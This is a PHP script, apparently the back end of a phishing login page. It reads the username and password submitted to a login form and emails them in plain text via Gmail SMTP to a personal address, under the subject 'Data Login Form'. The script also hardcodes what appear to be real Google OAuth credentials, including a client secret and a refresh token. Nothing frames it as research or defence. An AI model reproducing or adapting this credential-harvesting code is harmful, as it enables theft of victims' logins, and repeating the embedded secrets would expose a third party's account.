<?php
require 'vendor/autoload.php';

use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;
use PHPMailer\PHPMailer\OAuth;
use League\OAuth2\Client\Provider\Google;

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = htmlspecialchars($_POST['inputUsername']);
    $password = htmlspecialchars($_POST['inputPassword']);

    // Gmail OAuth 2.0 Credentials
    $clientId = '457496890369-a4rbn7608g1skbuh1k470lspmlq2jbp9.apps.googleusercontent.com'; // Replace with your Client ID
    $clientSecret = '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'; // Replace with your Client Secret
    $refreshToken = '1//04MfBiTwfSGWICgYIARAAGAQSNwF-L9IrnNCy8Jzc9qoC31oQMKYqhN3_NrQ0OXPUEpDfO9jIfUFJpHlw3dEdg1FTXJNdNga2DE0'; // Replace with your Refresh Token
    $email = 'rendiwals4.sender@gmail.com'; // Your Gmail address

    $mail = new PHPMailer(true);

    try {
        // Server settings
        $mail->isSMTP();
        $mail->Host       = 'smtp.gmail.com';
        $mail->SMTPAuth   = true;
        $mail->AuthType   = 'XOAUTH2';
        $mail->SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS;
        $mail->Port       = 587;

        // OAuth 2.0 Configuration
        $mail->setOAuth(new OAuth([
            'provider' => new Google([
                'clientId'     => $clientId,
                'clientSecret' => $clientSecret,
            ]),
            'clientId'     => $clientId,
            'clientSecret' => $clientSecret,
            'refreshToken' => $refreshToken,
            'userName'     => $email,
        ]));

        // Email sender and recipient
        $mail->setFrom($email, 'Form Login');
        $mail->addAddress('rendiwals4@gmail.com', 'Rendi Wals'); // Replace with recipient's email

        // Email content
        $mail->isHTML(false);
        $mail->Subject = 'Data Login Form';
        $mail->Body    = "Data Login:\n\nUsername/Email: $username\nPassword: $password";

        // Send the email
        $mail->send();
        echo 'Form successfully sent!';
    } catch (Exception $e) {
        echo "Form failed to send. Error: {$mail->ErrorInfo}";
    }
} else {
    echo "Invalid access.";
}
